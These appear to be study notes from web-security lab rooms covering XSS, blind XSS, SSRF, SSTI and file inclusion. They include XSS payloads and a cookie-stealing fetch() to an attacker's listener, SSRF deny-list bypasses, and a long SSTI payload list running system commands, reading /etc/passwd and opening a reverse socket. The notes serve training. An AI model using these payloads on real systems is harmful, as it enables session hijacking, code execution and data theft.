The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.

Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.

How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use.

The aim for each level will be to execute the JavaScript alert function with the string THM, for example:
```
<script>alert('THM');</script>
```
Level One:

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:

![image](https://user-images.githubusercontent.com/24814781/182376108-f03ca070-c581-4917-9156-15fd3e328dd9.png)

If you view the Page Source, You'll see your name reflected in the code:

![image](https://user-images.githubusercontent.com/24814781/182376339-8b8f94bd-205c-42ca-aaad-8ccbb039bafe.png)

Instead of entering your name, we're instead going to try entering the following JavaScript Payload:
```
<script>alert('THM');</script>
```

Now when you click the enter button, you'll get an alert popup with the string THM and the page source will look like the following:

![image](https://user-images.githubusercontent.com/24814781/182376415-7369aa3d-483b-4621-a129-0d341ee8d7c9.png)

And then, you'll get a confirmation message that your payload was successful 

Level Two:

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![image](https://user-images.githubusercontent.com/24814781/182376729-b23c1bb8-a847-42be-8703-cc1ca7c4b7bf.png)

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![image](https://user-images.githubusercontent.com/24814781/182376808-74b188d7-231d-4bd3-9f61-1de45cd09c35.png)


t wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: 
```
"><script>alert('THM');</script>
```
The important part of the payload is the "> which closes the value parameter and then closes the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

![image](https://user-images.githubusercontent.com/24814781/182376944-83909a35-ba9a-4a25-a99b-2663ad6c3bb7.png)

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful

Level Three:

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.

![image](https://user-images.githubusercontent.com/24814781/182377524-1088703c-b0be-4ea0-bd57-53807883a5b3.png)

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: </textarea>
```
<script>alert('THM');</script>
```

![image](https://user-images.githubusercontent.com/24814781/182377574-1df21dcc-51fe-4187-92b0-843649969cf2.png)


The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful 

Level Four:

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

![image](https://user-images.githubusercontent.com/24814781/182377935-6a4d58d6-9bad-4905-8d4d-b2e399e53fda.png)

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload 
```
';alert('THM');//
```

which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

![image](https://user-images.githubusercontent.com/24814781/182378028-6deb673f-9481-4100-880e-7322cae5d406.png)


Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful

Level Five:

Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the <script>alert('THM');</script> payload, it won't work. When you view the page source, you'll see why. 

![image](https://user-images.githubusercontent.com/24814781/182378527-e5df77e9-6e1a-4dab-9999-cf073ef62a0c.png)

The word script  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.

When a word gets removed from a string, there's a helpful trick that you can try. 

Original Payload:
```
<sscriptcript>alert('THM');</sscriptcript>
```

Text to be removed (by the filter):
```
<sscriptcript>alert('THM');</sscriptcript>
```
Final Payload (after passing the filter):
```
<script>alert('THM');</script>
```

Try entering the payload 

```
<sscriptcript>alert('THM');</sscriptcript> 
```

and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful

Level Six:


Similar to level two, where we had to escape from the value attribute of an input tag, we can try "><script>alert('THM');</script> , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work. 

![image](https://user-images.githubusercontent.com/24814781/182379431-246237bd-8fda-482e-8510-27c53fdf58bf.png)

You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this 
```
/images/cat.jpg" onload="alert('THM'); 
```
and then viewing the page source, and you'll see how this will work.

![image](https://user-images.githubusercontent.com/24814781/182379524-419aa1eb-e121-418a-a899-7089d27ae30c.png)

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.

Polyglots:


An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Practical Example Blind XSS

For the last task, we will go over a Blind XSS vulnerability.

Click on the Customers tab on the top navigation bar and click the "Signup here" link to create an account. Once your account gets set up, click the Support Tickets tab, which is the feature we will investigate for weaknesses. 


Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 


Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.

![image](https://user-images.githubusercontent.com/24814781/182381106-ca5e0a57-dff3-43e4-a8fb-2f5b2cfaf343.png)
![image](https://user-images.githubusercontent.com/24814781/182381112-24310bb6-92c0-4b4d-9082-be547976268c.png)


Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:

```
</textarea>test
```

Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag. 

![image](https://user-images.githubusercontent.com/24814781/182381148-54e8f4c7-14da-4dbf-bb38-6cbd14645434.png)
![image](https://user-images.githubusercontent.com/24814781/182381158-4670396b-07eb-4a5e-8583-d1365a506f07.png)


Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:

```
</textarea><script>alert('THM');</script>
```

Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 


Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.


While using the TryHackMe AttackBox, let's set up a listening server using Netcat:

```
nc -nlvp 9001
```

Now that we've set up the method of receiving the exfiltrated information, let's build the payload.

```
</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
```

Let's breakdown the payload:

The "</textarea>" tag closes the textarea field. 

The "<script>tag" opens open an area for us to write JavaScript.

The "fetch()" command makes an HTTP request.

"{URL_OR_IP}" is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.

"?cookie=" is the query string that will contain the victim's cookies.

"btoa()" command base64 encodes the victim's cookies.

"document.cookie" accesses the victim's cookies for the Acme IT Support Website.

"</script>" closes the JavaScript code block.


Now create another ticket using the above payload, making sure to swap out the {URL_OR_IP} variable to your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you'll see the request come through containing the victim's cookies. 


You can now base64 decode this information using a site like https://www.base64decode.org/




### Insecure Design
Notable Common Weakness Enumerations (CWEs) include
CWE-209: Generation of Error Message Containing Sensitive Information
CWE-256: Unprotected Storage of Credentials
CWE-501: Trust Boundary Violation
CWE-522: Insufficiently Protected Credentials
```
https://owasp.org/Top10/A04_2021-Insecure_Design/
```

### Security Misconfiguration
Notable CWEs included are 
CWE-16 Configuration
CWE-611 Improper Restriction of XML External Entity Reference
```
https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
```

### Vulnerable and Outdated Components
Notable CWEs included are 
CWE-1104: Use of Unmaintained Third-Party Components and the two CWEs from Top 10 2013 and 2017
```
https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
```

### Identification and Authentication Failures 
Notable CWEs included are 
CWE-297: Improper Validation of Certificate with Host Mismatch
CWE-287: Improper Authentication
CWE-384: Session Fixation
```
https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures
```

### Security Logging and Monitoring Failures
Notable Common Weakness Enumerations (CWEs) include 
CWE-829: Inclusion of Functionality from Untrusted Control Sphere
CWE-494: Download of Code Without Integrity Check
CWE-502: Deserialization of Untrusted Data
```
https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
```

### Server-Side Request Forgery
```
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
```
```
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
```

What is an SSRF?

SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.


Types of SSRF

There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.
What's the impact?

A successful SSRF attack can result in any of the following: 

Access to unauthorised areas.
Access to customer/organisational data.
Ability to Scale to internal networks.
Reveal authentication tokens/credentials.
    
We're going to take you through some sample SSRF attacks and explain how they work.
    
The below example shows how the attacker can have complete control over the page requested by the webserver.
The Expected Request is what the website.com server is expecting to receive, with the section in red being the URL that the website will fetch for the information.
The attacker can modify the area in red to an URL of their choice.

![image](https://user-images.githubusercontent.com/24814781/182042173-fe691d3a-d263-4141-bad2-ab3a0ed6851f.png)

The below example shows how an attacker can still reach the /api/user page with only having control over the path by utilising directory traversal. When website.thm receives ../ this is a message to move up a directory which removes the /stock portion of the request and turns the final request into /api/user 

![image](https://user-images.githubusercontent.com/24814781/182042218-f94dec9b-a313-4a89-a283-c16670c6ad1d.png)


In this example, the attacker can control the server's subdomain to which the request is made. Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. 

![image](https://user-images.githubusercontent.com/24814781/182042248-8a5e67e8-33a2-409b-aca8-d24802245810.png)

Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by website.thm (that would normally authenticate to api.website.com). 

![image](https://user-images.githubusercontent.com/24814781/182042260-69c0141c-b079-425b-9c15-30fc7b28ee77.png)

Finding an SSRF

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

When a full URL is used in a parameter in the address bar:

![image](https://user-images.githubusercontent.com/24814781/182042795-e3c1654d-f936-47ca-9bb8-a5afc0bc9dd0.png)

A partial URL such as just the hostname:

![image](https://user-images.githubusercontent.com/24814781/182042816-7d3af384-11d8-4acd-9d95-e5cace4b9f64.png)

Or perhaps only the path of the URL:

![image](https://user-images.githubusercontent.com/24814781/182042821-28440640-6f5d-4e37-9a34-936f884942c0.png)


Some of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working payload.

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.


Defeating Common SSRF Defenses 

More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list.


Deny List

A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.


Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.


Allow List

An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.


SSRF Practical tips and example: 

Let's put what we've learnt about SSRF to the test in a fictional scenario.


We've come across two new endpoints during a content discovery exercise against the Acme IT Support website. The first one is /private, which gives us an error message explaining that the contents cannot be viewed from our IP address. The second is a new version of the customer account page at /customers/new-account-page with a new feature allowing customers to choose an avatar for their account.


Begin by clicking the Start Machine button to launch the Acme IT Support website. Once running, visit it at the URL https://10-10-194-155.p.thmlabs.com and then follow the below instructions to get the flag.


First, create a customer account and sign in. Once you've signed in, visit https://10-10-194-155.p.thmlabs.com/customers/new-account-page to view the new avatar selection feature. By viewing the page source of the avatar form, you'll see the avatar form field value contains the path to the image. The background-image style can confirm this in the above DIV element as per the screenshot below:

![image](https://user-images.githubusercontent.com/24814781/182043745-e0b115e0-3c19-46d5-9cf8-d5710087459a.png)

If you choose one of the avatars and then click the Update Avatar button, you'll see the form change and, above it, display your currently selected avatar. Viewing the page source will show your current avatar is displayed using the data URI scheme, and the image content is base64 encoded as per the screenshot below.

![image](https://user-images.githubusercontent.com/24814781/182043750-f1f38a61-17ea-4f6f-ac8b-09bdcb7ccb10.png)


Now let's try making the request again but changing the avatar value to private in hopes that the server will access the resource and get past the IP address block. To do this, firstly, right-click on one of the radio buttons on the avatar form and select Inspect:


![image](https://user-images.githubusercontent.com/24814781/182043760-7228cf52-8373-475a-8c50-b1ad405a1a33.png)


And then edit the value of the radio button to private:

![image](https://user-images.githubusercontent.com/24814781/182043766-7ad34c0b-c3f8-444e-b641-f50ae4262e80.png)


And then click the Update Avatar button. Unfortunately, it looks like the web application has a deny list in place and has blocked access to the /private endpoint.

![image](https://user-images.githubusercontent.com/24814781/182043776-633c74bd-86e5-4e8d-a518-7f157e1d9d72.png)

As you can see from the error message, the path cannot start with /private but don't worry, we've still got a trick up our sleeve to bypass this rule. We can use a directory traversal trick to reach our desired endpoint. Try setting the avatar value to x/../private 

![image](https://user-images.githubusercontent.com/24814781/182043784-368aff39-0496-4c0a-bbf7-19006ef08113.png)

You'll see we have now bypassed the rule, and the user updated the avatar. This trick works because when the web server receives the request for x/../private, it knows that the ../ string means to move up a directory that now translates the request to just /private.


Viewing the page source of the avatar form, you'll see the currently set avatar now contains the contents from the /private directory in base64 encoding, decode this content and it will reveal a flag that you can enter below.



### Server Side Template Injection
```
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```
```
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
```
```
{{4*4}}[[5*5]]
{{7*7}}
{{7*'7'}}
<%= 7 * 7 %>
${3*3}
${{7*7}}
@(1+2)
#{3*3}
#{ 7 * 7 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
```

### File Inclusion 
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion
```
```
https://highon.coffee/blog/lfi-cheat-sheet/
```

What is File inclusion?

This part aims to equip you with the essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. Also, we will discuss the risk of these vulnerabilities if they're found and the required remediation. We provide some practical examples of each vulnerability as well as hands-on challenges.

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.

![image](https://user-images.githubusercontent.com/24814781/182134102-72df6741-4aac-4cb3-9593-1e940949d90f.png)


For example, parameters are used with Google searching, where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe.   

Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.

![image](https://user-images.githubusercontent.com/24814781/182134315-3b6f4d78-0007-4172-8e65-8096787d8a78.png)

### Path Traversal

Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function here.
```
https://www.php.net/manual/en/function.file-get-contents.php
```

The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.

![image](https://user-images.githubusercontent.com/24814781/182134970-c1d42506-c1fb-407c-aebd-4a9bc259bab4.png)

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd

Suppose there isn't input validation, and instead of accessing the PDF files at /var/www/app/CVs location, the web application retrieves files from other directories, which in this case /etc/passwd. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.

![image](https://user-images.githubusercontent.com/24814781/182135113-2aa25d64-f459-41d0-b44a-bcc1ce3304a4.png)

As a result, the web application sends back the file's content to the user.

![image](https://user-images.githubusercontent.com/24814781/182135178-508f73f2-d675-4ad8-a5f3-32fdcc30fe48.png)


Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:

http://webapp.thm/get.php?file=../../../../boot.ini or

http://webapp.thm/get.php?file=../../../../windows/win.ini

The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:\.

Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing. 

![image](https://user-images.githubusercontent.com/24814781/182135355-40be92ee-6b19-4c48-994e-44011fa1ffb9.png)

### Local File Inclusion LFI

#### exmaple 1:

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

In this section, we will walk you through various LFI scenarios and how to exploit them.﻿

1. Suppose the web application provides two languages, and the user can select between the EN and AR

```
<?PHP 
	include($_GET["lang"]);
?>
```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd 

In this case, it works because there isn't a directory specified in the include function and no input validation.


2. Next, In the following code, the developer decided to specify the directory inside the function.

```
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

http://webapp.thm/index.php?lang=../../../../etc/passwd

#### example 2:

In this task, we go a little bit deeper into LFI. We discussed a couple of techniques to bypass the filter within the include function.

1. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like:  include(languages/THM.php);. 

If you look at the directory closely, we can tell the function includes files in the languages directory is adding  .php at the end of the entry. Thus the valid input will be something as follows:  index.php?lang=EN, where the file EN is located inside the given languages directory and named  EN.php. 

Also, the error message disclosed another important piece of information about the full web application directory path which is /var/www/html/THM-4/

To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

http://webapp.thm/index.php?lang=../../../../etc/passwd

Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

